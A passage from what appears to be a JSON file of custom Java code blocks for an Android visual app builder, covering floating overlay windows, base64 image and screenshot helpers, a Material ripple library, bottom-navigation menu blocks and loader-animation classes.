\u003d (int) event.getRawY(); \nbreak;\n\ncase MotionEvent.ACTION_MOVE: int nowX \u003d (int) event.getRawX(); \nint nowY \u003d (int) event.getRawY(); \nint movedX \u003d nowX - x; \nint movedY \u003d nowY - y; \nx \u003d nowX; y \u003d nowY; \nlayoutParams.x \u003d layoutParams.x + movedX; \nlayoutParams.y \u003d layoutParams.y + movedY; windowManager.updateViewLayout(view, layoutParams); \nbreak; \ndefault: \nbreak; \n}\n return true;\n }\n }\n\npublic void closes(){\ntry{\nwindowManager.removeView(displayView);\n}\ncatch(Exception e){\n        }\n    }\nprivate void _reCall(){","color":"#808200","name":"FloatingWindowLibrary","typeName":"","palette":"55","type":"c","spec":"floatingWindowLibrary view %m.customViews "},{"code":"android.provider.Settings.canDrawOverlays(%s.this)","color":"#808200","name":"canDrawOverlays","typeName":"","palette":"55","type":"b","spec":"%m.activity canDrawOverlays"},{"code":"Intent intent \u003d new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,\nUri.parse(\"package:\" + getPackageName()));\nstartActivity(intent);","color":"#808200","name":"getPermissionOverlay","typeName":"","palette":"55","type":" ","spec":"getOverLayPermission"},{"code":"showFloatingWindow();","color":"#808200","name":"showFloatingWindow","typeName":"","palette":"55","type":" ","spec":"showFloatingWindow"},{"code":"closes();","color":"#808200","name":"closeWindow","typeName":"","palette":"55","type":"f","spec":"closeWindow"},{"code":"final %s \u003d displayView.findViewById(R.id.%s);","color":"#808200","name":"FloatingFindViewID","typeName":"","palette":"55","type":" ","spec":"%s.inputOnly findViewById %s.inputOnly "},{"code":"new Object(){\n\t\t\tpublic void start(){\n\t\t\t\tnew AsyncTaskEx().execute();\n\t\t\t}\n\t\t\tpublic void run(){\n\t\t\t\t%s\n\t\t\t}\n\t\t\tfinal class AsyncTaskEx extends AsyncTask\u003cVoid, Void, Void\u003e {\n\t\t\t\t@Override\n\t\t\t\tprotected Void doInBackground(Void... arg0) {\n\t\t\t\t\trun();\n\t\t\t\t\treturn null;}\n\t\t\t\t@Override\n\t\t\t\tprotected void onPostExecute(Void result) {\n\t\t\t\t\t%s\n\t\t\t\t\treturn ;}\n\t\t\t\t@Override\n\t\t\t\tprotected void onPreExecute() {\n\t\t\t\t\treturn ;}}}.start();","color":"#41EAC1","name":"AsyncTaskVoid","typeName":"","palette":"55","type":"e","spec":"AsyncTask StartVoid \u003d\u003e Finish"},{"code":"new Object(){\n\t\t\t private void setB64Image(ImageView iv265, String s274){\n\t\t\t\t try{\n\t\t\t\t byte[] decodedString \u003d android.util.Base64.decode(s274.replace(\" \",\"\").replace(\"\\n\",\"\"), android.util.Base64.DEFAULT);\n\t\t\t\t android.graphics.Bitmap decodedByte \u003d android.graphics.BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length); \n\t\t\t\t iv265.setImageBitmap(decodedByte);\n\t\t\t\t }catch(Exception e72) {}\n\t\t\t }\n\t\t }.setB64Image(%s,%s);","color":"#9B639F","name":"setImageFromBase64String","typeName":"","palette":"55","type":" ","spec":"%m.imageview setBase64Image %s"},{"code":"windowManager \u003d (WindowManager) getSystemService(WINDOW_SERVICE); \nlayoutParams \u003d new WindowManager.LayoutParams();\n\nif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.O) { \nlayoutParams.type \u003d WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY; \n} else { \nlayoutParams.type \u003d WindowManager.LayoutParams.TYPE_PHONE; \n}\n\nlayoutParams.format \u003d PixelFormat.RGBA_8888; layoutParams.gravity \u003d Gravity.LEFT | Gravity.TOP; layoutParams.flags \u003d WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE; layoutParams.width \u003d %s; layoutParams.height \u003d %s; layoutParams.x \u003d 0;\nlayoutParams.y \u003d 0;","color":"#808200","name":"onCreateFWTyp1","typeName":"","palette":"55","type":" ","spec":"addToOnCreateActivity (1) FW width %d height %d"},{"code":"new Object(){\n\tpublic String getScreenshotToB64() { try {\n\t\t\tView v1 \u003d getWindow().getDecorView().getRootView();\n\t\t\tv1.setDrawingCacheEnabled(true);\n\t\t\tjava.io.ByteArrayOutputStream baos \u003d new java.io.ByteArrayOutputStream();\n\t\t\tandroid.graphics.Bitmap bm \u003d android.graphics.Bitmap.createBitmap(v1.getDrawingCache()); \n\t\t\tv1.setDrawingCacheEnabled(false);\n\t\t\tbm.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, baos);\n\t\t\tbyte[] imageBytes \u003d baos.toByteArray();\n\t\t\tString imageString \u003d android.util.Base64.encodeToString(imageBytes ,android.util.Base64.DEFAULT);\n\t\t\treturn imageString;\n\t\t}catch(Exception e){return \"\";}\n\t\n\t}\n\t}.getScreenshotToB64()","color":"#421B5B","name":"getScreenshotToB64","typeName":"","palette":"55","type":"s","spec":"getScreenshotToB64"},{"code":"\n}\npublic static class MaterialRippleLayout extends FrameLayout {\n    private static final int     DEFAULT_DURATION        \u003d 350;\n    private static final int     DEFAULT_FADE_DURATION   \u003d 75;\n    private static final float   DEFAULT_DIAMETER_DP     \u003d 35;\n    private static final float   DEFAULT_ALPHA           \u003d 0.2f;\n    private static final int     DEFAULT_COLOR           \u003d Color.BLACK;\n    private static final int     DEFAULT_BACKGROUND      \u003d Color.TRANSPARENT;\n    private static final boolean DEFAULT_HOVER           \u003d true;\n    private static final boolean DEFAULT_DELAY_CLICK     \u003d true;\n    private static final boolean DEFAULT_PERSISTENT      \u003d false;\n    private static final boolean DEFAULT_SEARCH_ADAPTER  \u003d false;\n    private static final boolean DEFAULT_RIPPLE_OVERLAY  \u003d false;\n    private static final int     DEFAULT_ROUNDED_CORNERS \u003d 0;\n    private static final int  FADE_EXTRA_DELAY \u003d 50;\n    private static final long HOVER_DURATION   \u003d 2500;\n    private final Paint paint  \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n    private final Rect  bounds \u003d new Rect();\n    private int      rippleColor;\n    private boolean  rippleOverlay;\n    private boolean  rippleHover;\n    private int      rippleDiameter;\n    private int      rippleDuration;\n    private int      rippleAlpha;\n    private boolean  rippleDelayClick;\n    private int      rippleFadeDuration;\n    private boolean  ripplePersistent;\n    private android.graphics.drawable.Drawable rippleBackground;\n    private boolean  rippleInAdapter;\n    private float    rippleRoundedCorners;\n    private float radius;\n    private AdapterView parentAdapter;\n    private View childView;\n    private AnimatorSet    rippleAnimator;\n    private ObjectAnimator hoverAnimator;\n    private Point currentCoords  \u003d new Point();\n    private Point previousCoords \u003d new Point();\n    private int layerType;\n    private boolean eventCancelled;\n    private boolean prepressed;\n    private int     positionInAdapter;\n    private GestureDetector   gestureDetector;\n    private PerformClickEvent pendingClickEvent;\n    private PressedEvent      pendingPressEvent;\n    public static RippleBuilder on(View view) {\n        return new RippleBuilder(view);\n    }\n    public MaterialRippleLayout(Context context) {\n        this(context, null, 0);\n    }\n    public MaterialRippleLayout(Context context, AttributeSet attrs) {\n        this(context, attrs, 0);\n    }\n    public MaterialRippleLayout(Context context, AttributeSet attrs, int defStyle) {\n        super(context, attrs, defStyle);\n        setWillNotDraw(false);\n        gestureDetector \u003d new GestureDetector(context, longClickListener);\n        \n        rippleColor \u003d DEFAULT_COLOR;\n        rippleDiameter \u003d  (int) dpToPx(getResources(), DEFAULT_DIAMETER_DP);\n        rippleOverlay \u003d DEFAULT_RIPPLE_OVERLAY;\n        rippleHover \u003d DEFAULT_HOVER;\n        rippleDuration \u003d DEFAULT_DURATION;\n        rippleAlpha \u003d (int) (255 * DEFAULT_ALPHA);\n        rippleDelayClick \u003d DEFAULT_DELAY_CLICK;\n        rippleFadeDuration \u003d DEFAULT_FADE_DURATION;\n        rippleBackground \u003d new android.graphics.drawable.ColorDrawable(DEFAULT_BACKGROUND);\n        ripplePersistent \u003d DEFAULT_PERSISTENT;\n        rippleInAdapter \u003d DEFAULT_SEARCH_ADAPTER;\n        rippleRoundedCorners \u003d DEFAULT_ROUNDED_CORNERS;\n\n        paint.setColor(rippleColor);\n        paint.setAlpha(rippleAlpha);\n        enableClipPathSupportIfNecessary();\n    }\n    @SuppressWarnings(\"unchecked\")\n    public \u003cT extends View\u003e T getChildView() {\n        return (T) childView;\n    }\n    @Override\n    public final void addView(View child, int index, ViewGroup.LayoutParams params) {\n        if (getChildCount() \u003e 0) {\n            throw new IllegalStateException(\"MaterialRippleLayout can host only one child\");\n        }\n        childView \u003d child;\n        super.addView(child, index, params);\n    }\n    @Override\n    public void setOnClickListener(OnClickListener onClickListener) {\n        if (childView \u003d\u003d null) {\n            throw new IllegalStateException(\"MaterialRippleLayout must have a child view to handle clicks\");\n        }\n        childView.setOnClickListener(onClickListener);\n    }\n    @Override\n    public void setOnLongClickListener(OnLongClickListener onClickListener) {\n        if (childView \u003d\u003d null) {\n            throw new IllegalStateException(\"MaterialRippleLayout must have a child view to handle clicks\");\n        }\n        childView.setOnLongClickListener(onClickListener);\n    }\n    @Override\n    public boolean onInterceptTouchEvent(MotionEvent event) {\n        return !findClickableViewInChild(childView, (int) event.getX(), (int) event.getY());\n    }\n    @Override\n    public boolean onTouchEvent(MotionEvent event) {\n        boolean superOnTouchEvent \u003d super.onTouchEvent(event);\n        if (!isEnabled() || !childView.isEnabled()) return superOnTouchEvent;\n        boolean isEventInBounds \u003d bounds.contains((int) event.getX(), (int) event.getY());\n        if (isEventInBounds) {\n            previousCoords.set(currentCoords.x, currentCoords.y);\n            currentCoords.set((int) event.getX(), (int) event.getY());\n        }\n        boolean gestureResult \u003d gestureDetector.onTouchEvent(event);\n        if (gestureResult || hasPerformedLongPress) {\n            return true;\n        } else {\n            int action \u003d event.getActionMasked();\n            switch (action) {\n                case MotionEvent.ACTION_UP:\n                    pendingClickEvent \u003d new PerformClickEvent();\n                    if (prepressed) {\n                        childView.setPressed(true);\n                        postDelayed(\n                            new Runnable() {\n                                @Override public void run() {\n                                    childView.setPressed(false);\n                                }\n                            }, ViewConfiguration.getPressedStateDuration());\n                    }\n                    if (isEventInBounds) {\n                        startRipple(pendingClickEvent);\n                    } else if (!rippleHover) {\n                        setRadius(0);\n                    }\n                    if (!rippleDelayClick \u0026\u0026 isEventInBounds) {\n                        pendingClickEvent.run();\n                    }\n                    cancelPressedEvent();\n                    break;\n                case MotionEvent.ACTION_DOWN:\n                    setPositionInAdapter();\n                    eventCancelled \u003d false;\n                    pendingPressEvent \u003d new PressedEvent(event);\n                    if (isInScrollingContainer()) {\n                        cancelPressedEvent();\n                        prepressed \u003d true;\n                        postDelayed(pendingPressEvent, ViewConfiguration.getTapTimeout());\n                    } else {\n                        pendingPressEvent.run();\n                    }\n                    break;\n                case MotionEvent.ACTION_CANCEL:\n                    if (rippleInAdapter) {\n                        currentCoords.set(previousCoords.x, previousCoords.y);\n                        previousCoords \u003d new Point();\n                    }\n                    childView.onTouchEvent(event);\n                    if (rippleHover) {\n                        if (!prepressed) {\n                            startRipple(null);\n                        }\n                    } else {\n                        childView.setPressed(false);\n                    }\n                    cancelPressedEvent();\n                    break;\n                case MotionEvent.ACTION_MOVE:\n                    if (rippleHover) {\n                        if (isEventInBounds \u0026\u0026 !eventCancelled) {\n                            invalidate();\n                        } else if (!isEventInBounds) {\n                            startRipple(null);\n                        }\n                    }\n                    if (!isEventInBounds) {\n                        cancelPressedEvent();\n                        if (hoverAnimator !\u003d null) {\n                            hoverAnimator.cancel();\n                        }\n                        childView.onTouchEvent(event);\n                        eventCancelled \u003d true;\n                    }\n                    break;\n            }\n            return true;\n        }\n    }\n    private void cancelPressedEvent() {\n        if (pendingPressEvent !\u003d null) {\n            removeCallbacks(pendingPressEvent);\n            prepressed \u003d false;\n        }\n    }\n    private boolean hasPerformedLongPress;\n    private android.view.GestureDetector.SimpleOnGestureListener longClickListener \u003d new GestureDetector.SimpleOnGestureListener() {\n        public void onLongPress(MotionEvent e) {\n            hasPerformedLongPress \u003d childView.performLongClick();\n            if (hasPerformedLongPress) {\n                if (rippleHover) {\n                    startRipple(null);\n                }\n                cancelPressedEvent();\n            }\n        }\n        @Override\n        public boolean onDown(MotionEvent e) {\n            hasPerformedLongPress \u003d false;\n            return super.onDown(e);\n        }\n    };\n    private void startHover() {\n        if (eventCancelled) return;\n        if (hoverAnimator !\u003d null) {\n            hoverAnimator.cancel();\n        }\n        final float radius \u003d (float) (Math.sqrt(Math.pow(getWidth(), 2) + Math.pow(getHeight(), 2)) * 1.2f);\n        hoverAnimator \u003d ObjectAnimator.ofFloat(this, radiusProperty, rippleDiameter, radius)\n            .setDuration(HOVER_DURATION);\n        hoverAnimator.setInterpolator(new android.view.animation.LinearInterpolator());\n        hoverAnimator.start();\n    }\n    private void startRipple(final Runnable animationEndRunnable) {\n        if (eventCancelled) return;\n        float endRadius \u003d getEndRadius();\n        cancelAnimations();\n        rippleAnimator \u003d new AnimatorSet();\n        rippleAnimator.addListener(new AnimatorListenerAdapter() {\n            @Override public void onAnimationEnd(Animator animation) {\n                if (!ripplePersistent) {\n                    setRadius(0);\n                    setRippleAlpha(rippleAlpha);\n                }\n                if (animationEndRunnable !\u003d null \u0026\u0026 rippleDelayClick) {\n                    animationEndRunnable.run();\n                }\n                childView.setPressed(false);\n            }\n        });\n        ObjectAnimator ripple \u003d ObjectAnimator.ofFloat(this, radiusProperty, radius, endRadius);\n        ripple.setDuration(rippleDuration);\n        ripple.setInterpolator(new android.view.animation.DecelerateInterpolator());\n        ObjectAnimator fade \u003d ObjectAnimator.ofInt(this, circleAlphaProperty, rippleAlpha, 0);\n        fade.setDuration(rippleFadeDuration);\n        fade.setInterpolator(new android.view.animation.AccelerateInterpolator());\n        fade.setStartDelay(rippleDuration - rippleFadeDuration - FADE_EXTRA_DELAY);\n        if (ripplePersistent) {\n            rippleAnimator.play(ripple);\n        } else if (getRadius() \u003e endRadius) {\n            fade.setStartDelay(0);\n            rippleAnimator.play(fade);\n        } else {\n            rippleAnimator.playTogether(ripple, fade);\n        }\n        rippleAnimator.start();\n    }\n    private void cancelAnimations() {\n        if (rippleAnimator !\u003d null) {\n            rippleAnimator.cancel();\n            rippleAnimator.removeAllListeners();\n        }\n        if (hoverAnimator !\u003d null) {\n            hoverAnimator.cancel();\n        }\n    }\n    private float getEndRadius() {\n        final int width \u003d getWidth();\n        final int height \u003d getHeight();\n        final int halfWidth \u003d width / 2;\n        final int halfHeight \u003d height / 2;\n        final float radiusX \u003d halfWidth \u003e currentCoords.x ? width - currentCoords.x : currentCoords.x;\n        final float radiusY \u003d halfHeight \u003e currentCoords.y ? height - currentCoords.y : currentCoords.y;\n        return (float) Math.sqrt(Math.pow(radiusX, 2) + Math.pow(radiusY, 2)) * 1.2f;\n    }\n    private boolean isInScrollingContainer() {\n        ViewParent p \u003d getParent();\n        while (p !\u003d null \u0026\u0026 p instanceof ViewGroup) {\n            if (((ViewGroup) p).shouldDelayChildPressedState()) {\n                return true;\n            }\n            p \u003d p.getParent();\n        }\n        return false;\n    }\n    private AdapterView findParentAdapterView() {\n        if (parentAdapter !\u003d null) {\n            return parentAdapter;\n        }\n        ViewParent current \u003d getParent();\n        while (true) {\n            if (current instanceof AdapterView) {\n                parentAdapter \u003d (AdapterView) current;\n                return parentAdapter;\n            } else {\n                try {\n                    current \u003d current.getParent();\n                } catch (NullPointerException npe) {\n                    throw new RuntimeException(\"Could not find a parent AdapterView\");\n                }\n            }\n        }\n    }\n    private void setPositionInAdapter() {\n        if (rippleInAdapter) {\n            positionInAdapter \u003d findParentAdapterView().getPositionForView(MaterialRippleLayout.this);\n        }\n    }\n    private boolean adapterPositionChanged() {\n        if (rippleInAdapter) {\n            int newPosition \u003d findParentAdapterView().getPositionForView(MaterialRippleLayout.this);\n            final boolean changed \u003d newPosition !\u003d positionInAdapter;\n            positionInAdapter \u003d newPosition;\n            if (changed) {\n                cancelPressedEvent();\n                cancelAnimations();\n                childView.setPressed(false);\n                setRadius(0);\n            }\n            return changed;\n        }\n        return false;\n    }\n    private boolean findClickableViewInChild(View view, int x, int y) {\n        if (view instanceof ViewGroup) {\n            ViewGroup viewGroup \u003d (ViewGroup) view;\n            for (int i \u003d 0; i \u003c viewGroup.getChildCount(); i++) {\n                View child \u003d viewGroup.getChildAt(i);\n                final Rect rect \u003d new Rect();\n                child.getHitRect(rect);\n                final boolean contains \u003d rect.contains(x, y);\n                if (contains) {\n                    return findClickableViewInChild(child, x - rect.left, y - rect.top);\n                }\n            }\n        } else if (view !\u003d childView) {\n            return (view.isEnabled() \u0026\u0026 (view.isClickable() || view.isLongClickable() || view.isFocusableInTouchMode()));\n        }\n        return view.isFocusableInTouchMode();\n    }\n    @Override\n    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n        super.onSizeChanged(w, h, oldw, oldh);\n        bounds.set(0, 0, w, h);\n        rippleBackground.setBounds(bounds);\n    }\n    @Override\n    public boolean isInEditMode() {\n        return true;\n    }\n    @Override\n    public void draw(Canvas canvas) {\n        final boolean positionChanged \u003d adapterPositionChanged();\n        if (rippleOverlay) {\n            if (!positionChanged) {\n                rippleBackground.draw(canvas);\n            }\n            super.draw(canvas);\n            if (!positionChanged) {\n                if (rippleRoundedCorners !\u003d 0) {\n                    Path clipPath \u003d new Path();\n                    RectF rect \u003d new RectF(0, 0, canvas.getWidth(), canvas.getHeight());\n                    clipPath.addRoundRect(rect, rippleRoundedCorners, rippleRoundedCorners, Path.Direction.CW);\n                    canvas.clipPath(clipPath);\n                }\n                canvas.drawCircle(currentCoords.x, currentCoords.y, radius, paint);\n            }\n        } else {\n            if (!positionChanged) {\n                rippleBackground.draw(canvas);\n                canvas.drawCircle(currentCoords.x, currentCoords.y, radius, paint);\n            }\n            super.draw(canvas);\n        }\n    }\n    private Property\u003cMaterialRippleLayout, Float\u003e radiusProperty\n        \u003d new Property\u003cMaterialRippleLayout, Float\u003e(Float.class, \"radius\") {\n        @Override\n        public Float get(MaterialRippleLayout object) {\n            return object.getRadius();\n        }\n        @Override\n        public void set(MaterialRippleLayout object, Float value) {\n            object.setRadius(value);\n        }\n    };\n    private float getRadius() {\n        return radius;\n    }\n    public void setRadius(float radius) {\n        this.radius \u003d radius;\n        invalidate();\n    }\n    private Property\u003cMaterialRippleLayout, Integer\u003e circleAlphaProperty\n        \u003d new Property\u003cMaterialRippleLayout, Integer\u003e(Integer.class, \"rippleAlpha\") {\n        @Override\n        public Integer get(MaterialRippleLayout object) {\n            return object.getRippleAlpha();\n        }\n        @Override\n        public void set(MaterialRippleLayout object, Integer value) {\n            object.setRippleAlpha(value);\n        }\n    };\n    public int getRippleAlpha() {\n        return paint.getAlpha();\n    }\n    public void setRippleAlpha(Integer rippleAlpha) {\n        paint.setAlpha(rippleAlpha);\n        invalidate();\n    }\n    public void setRippleColor(int rippleColor) {\n        this.rippleColor \u003d rippleColor;\n        paint.setColor(rippleColor);\n        paint.setAlpha(rippleAlpha);\n        invalidate();\n    }\n    public void setRippleOverlay(boolean rippleOverlay) {\n        this.rippleOverlay \u003d rippleOverlay;\n    }\n    public void setRippleDiameter(int rippleDiameter) {\n        this.rippleDiameter \u003d rippleDiameter;\n    }\n    public void setRippleDuration(int rippleDuration) {\n        this.rippleDuration \u003d rippleDuration;\n    }\n    public void setRippleBackground(int color) {\n        rippleBackground \u003d new android.graphics.drawable.ColorDrawable(color);\n        rippleBackground.setBounds(bounds);\n        invalidate();\n    }\n    public void setRippleHover(boolean rippleHover) {\n        this.rippleHover \u003d rippleHover;\n    }\n    public void setRippleDelayClick(boolean rippleDelayClick) {\n        this.rippleDelayClick \u003d rippleDelayClick;\n    }\n    public void setRippleFadeDuration(int rippleFadeDuration) {\n        this.rippleFadeDuration \u003d rippleFadeDuration;\n    }\n    public void setRipplePersistent(boolean ripplePersistent) {\n        this.ripplePersistent \u003d ripplePersistent;\n    }\n    public void setRippleInAdapter(boolean rippleInAdapter) {\n        this.rippleInAdapter \u003d rippleInAdapter;\n    }\n    public void setRippleRoundedCorners(int rippleRoundedCorner) {\n        this.rippleRoundedCorners \u003d rippleRoundedCorner;\n        enableClipPathSupportIfNecessary();\n    }\n    public void setDefaultRippleAlpha(float alpha) {\n        this.rippleAlpha \u003d (int) (255 * alpha);\n        paint.setAlpha(rippleAlpha);\n        invalidate();\n    }\n    public void performRipple() {\n        currentCoords \u003d new Point(getWidth() / 2, getHeight() / 2);\n        startRipple(null);\n    }\n    public void performRipple(Point anchor) {\n        currentCoords \u003d new Point(anchor.x, anchor.y);\n        startRipple(null);\n    }\n    private void enableClipPathSupportIfNecessary() {\n        if (Build.VERSION.SDK_INT \u003c\u003d Build.VERSION_CODES.JELLY_BEAN_MR1) {\n            if (rippleRoundedCorners !\u003d 0) {\n                layerType \u003d getLayerType();\n                setLayerType(LAYER_TYPE_SOFTWARE, null);\n            } else {\n                setLayerType(layerType, null);\n            }\n        }\n    }\n    private class PerformClickEvent implements Runnable {\n        @Override public void run() {\n            if (hasPerformedLongPress) return;\n            if (getParent() instanceof AdapterView) {\n                if (!childView.performClick())\n                    clickAdapterView((AdapterView) getParent());\n            } else if (rippleInAdapter) {\n                clickAdapterView(findParentAdapterView());\n            } else {\n                childView.performClick();\n            }\n        }\n        private void clickAdapterView(AdapterView parent) {\n            final int position \u003d parent.getPositionForView(MaterialRippleLayout.this);\n            final long itemId \u003d parent.getAdapter() !\u003d null\n                ? parent.getAdapter().getItemId(position)\n                : 0;\n            if (position !\u003d AdapterView.INVALID_POSITION) {\n                parent.performItemClick(MaterialRippleLayout.this, position, itemId);\n            }\n        }\n    }\n    private final class PressedEvent implements Runnable {\n        private final MotionEvent event;\n        public PressedEvent(MotionEvent event) {\n            this.event \u003d event;\n        }\n        @Override\n        public void run() {\n            prepressed \u003d false;\n            childView.setLongClickable(false);\n            childView.onTouchEvent(event);\n            childView.setPressed(true);\n            if (rippleHover) {\n                startHover();\n            }\n        }\n    }\n    static float dpToPx(android.content.res.Resources resources, float dp) {\n        return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, resources.getDisplayMetrics());\n    }\n    public static class RippleBuilder {\n        private final Context context;\n        private final View    child;\n        private int     rippleColor         \u003d DEFAULT_COLOR;\n        private boolean rippleOverlay       \u003d DEFAULT_RIPPLE_OVERLAY;\n        private boolean rippleHover         \u003d DEFAULT_HOVER;\n        private float   rippleDiameter      \u003d DEFAULT_DIAMETER_DP;\n        private int     rippleDuration      \u003d DEFAULT_DURATION;\n        private float   rippleAlpha         \u003d DEFAULT_ALPHA;\n        private boolean rippleDelayClick    \u003d DEFAULT_DELAY_CLICK;\n        private int     rippleFadeDuration  \u003d DEFAULT_FADE_DURATION;\n        private boolean ripplePersistent    \u003d DEFAULT_PERSISTENT;\n        private int     rippleBackground    \u003d DEFAULT_BACKGROUND;\n        private boolean rippleSearchAdapter \u003d DEFAULT_SEARCH_ADAPTER;\n        private float   rippleRoundedCorner \u003d DEFAULT_ROUNDED_CORNERS;\n        public RippleBuilder(View child) {\n            this.child \u003d child;\n            this.context \u003d child.getContext();\n        }\n        public RippleBuilder rippleColor(int color) {\n            this.rippleColor \u003d color;\n            return this;\n        }\n        public RippleBuilder rippleOverlay(boolean overlay) {\n            this.rippleOverlay \u003d overlay;\n            return this;\n        }\n        public RippleBuilder rippleHover(boolean hover) {\n            this.rippleHover \u003d hover;\n            return this;\n        }\n        public RippleBuilder rippleDiameterDp(int diameterDp) {\n            this.rippleDiameter \u003d diameterDp;\n            return this;\n        }\n        public RippleBuilder rippleDuration(int duration) {\n            this.rippleDuration \u003d duration;\n            return this;\n        }\n        public RippleBuilder rippleAlpha(float alpha) {\n            this.rippleAlpha \u003d alpha;\n            return this;\n        }\n        public RippleBuilder rippleDelayClick(boolean delayClick) {\n            this.rippleDelayClick \u003d delayClick;\n            return this;\n        }\n        public RippleBuilder rippleFadeDuration(int fadeDuration) {\n            this.rippleFadeDuration \u003d fadeDuration;\n            return this;\n        }\n        public RippleBuilder ripplePersistent(boolean persistent) {\n            this.ripplePersistent \u003d persistent;\n            return this;\n        }\n        public RippleBuilder rippleBackground(int color) {\n            this.rippleBackground \u003d color;\n            return this;\n        }\n        public RippleBuilder rippleInAdapter(boolean inAdapter) {\n            this.rippleSearchAdapter \u003d inAdapter;\n            return this;\n        }\n        public RippleBuilder rippleRoundedCorners(int radiusDp) {\n            this.rippleRoundedCorner \u003d radiusDp;\n            return this;\n        }\n        public MaterialRippleLayout create() {\n            MaterialRippleLayout layout \u003d new MaterialRippleLayout(context);\n            layout.setRippleColor(rippleColor);\n            layout.setDefaultRippleAlpha(rippleAlpha);\n            layout.setRippleDelayClick(rippleDelayClick);\n            layout.setRippleDiameter((int) dpToPx(context.getResources(), rippleDiameter));\n            layout.setRippleDuration(rippleDuration);\n            layout.setRippleFadeDuration(rippleFadeDuration);\n            layout.setRippleHover(rippleHover);\n            layout.setRipplePersistent(ripplePersistent);\n            layout.setRippleOverlay(rippleOverlay);\n            layout.setRippleBackground(rippleBackground);\n            layout.setRippleInAdapter(rippleSearchAdapter);\n            layout.setRippleRoundedCorners((int) dpToPx(context.getResources(), rippleRoundedCorner));\n            ViewGroup.LayoutParams params \u003d child.getLayoutParams();\n            ViewGroup parent \u003d (ViewGroup) child.getParent();\n            int index \u003d 0;\n            if (parent !\u003d null \u0026\u0026 parent instanceof MaterialRippleLayout) {\n                throw new IllegalStateException(\"MaterialRippleLayout could not be created: parent of the view already is a MaterialRippleLayout\");\n            }\n            if (parent !\u003d null) {\n                index \u003d parent.indexOfChild(child);\n                parent.removeView(child);\n            }\n            layout.addView(child, new ViewGroup.LayoutParams(android.view.ViewGroup.LayoutParams.MATCH_PARENT, android.view.ViewGroup.LayoutParams.MATCH_PARENT));\n            if (parent !\u003d null) {\n                parent.addView(layout, index, params);\n            }\n            return layout;\n        }\n    }\n}\n{","name":"MaterialRipple Lib","palette":"56","type":" ","spec":"MaterialRipple Lib"},{"code":"MaterialRippleLayout.on(%1$s)\n           .rippleColor(%2$s)\n           .create();","name":"MaterialRipple ","palette":"56","type":" ","spec":"MaterialRipple%m.view colour%m.color"},{"code":"%s.getMenu().add(%s);","name":"bnv addMenu","palette":"57","type":" ","spec":"%m.BottomNavigationView addMenu %s"},{"code":"%s.getMenu().add(%s).setIcon(R.drawable.%s);","name":"bnv addMenuWithIcon","palette":"57","type":" ","spec":"%m.BottomNavigationView addMenu %s withIcon %m.resource_bg"},{"code":"%s.setItemBackgroundResource(R.drawable.%s);","name":"bnv setItemBackgroundResource","palette":"57","type":" ","spec":"%m.BottomNavigationView setItemBackgroundResource %m.resource_bg"},{"code":"%s.setItemIconSize(%s);","name":"bnv setItemIconSize","palette":"57","type":" ","spec":"%m.BottomNavigationView setItemIconSize %d"},{"code":"%s.setSelectedItemId(%s);","name":"bnv setSelectedItemId","palette":"57","type":" ","spec":"%m.BottomNavigationView setSelectedItemId %d"},{"code":"if (_titleMenu.equals(\"%s\")) {\r\n\t%s\t\t\t\t\r\n}","name":"sendbroad","palette":"57","type":"c","spec":"On Item By Id %s.InputOnly Clicked"},{"code":"return true;","color":"#2196f3","name":"returntrue","palette":"57","type":" ","spec":"Bottom End Block"},{"code":"\t\n\t\t\n}\n\t\t\tpublic class Arc extends GraphicObject {\n\t\t\t\tprivate android.graphics.RectF oval;\n\t\t\t\tprivate float startAngle;\n\t\t\t\tprivate float sweepAngle;\n\t\t\t\tprivate boolean useCenter;\n\n\t\t\t\tpublic void setOval(android.graphics.RectF oval) {\n\t\t\t\t\tthis.oval \u003d oval;\n\t\t\t\t}\n\n\t\t\t\tpublic void setStartAngle(float startAngle) {\n\t\t\t\t\tthis.startAngle \u003d startAngle;\n\t\t\t\t}\n\n\t\t\t\tpublic void setSweepAngle(float sweepAngle) {\n\t\t\t\t\tthis.sweepAngle \u003d sweepAngle;\n\t\t\t\t}\n\n\t\t\t\tpublic void setUseCenter(boolean useCenter) {\n\t\t\t\t\tthis.useCenter \u003d useCenter;\n\t\t\t\t}\n\n\t\t\t\tpublic float getStartAngle() {\n\t\t\t\t\treturn startAngle;\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawArc(oval, startAngle, sweepAngle, useCenter, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic class Balloon extends LoaderView {\n\t\t\t\t@Override public void initializeObjects() {\n\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Circle extends GraphicObject {\n\t\t\t\tprivate PointF center;\n\t\t\t\tprivate float radius;\n\n\t\t\t\tpublic Circle() {\n\t\t\t\t\tcenter \u003d new PointF();\n\t\t\t\t}\n\n\t\t\t\tpublic void setRadius(float radius) {\n\t\t\t\t\tthis.radius \u003d radius;\n\t\t\t\t}\n\n\t\t\t\tpublic void setCenter(float x, float y) {\n\t\t\t\t\tcenter.set(x, y);\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawCircle(center.x, center.y, radius, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class ClassicSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int circlesSize;\n\n\t\t\t\tpublic ClassicSpinner() {\n\t\t\t\t\tcirclesSize \u003d 8;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[circlesSize];\n\n\t\t\t\t\tfor (int i \u003d 0; i 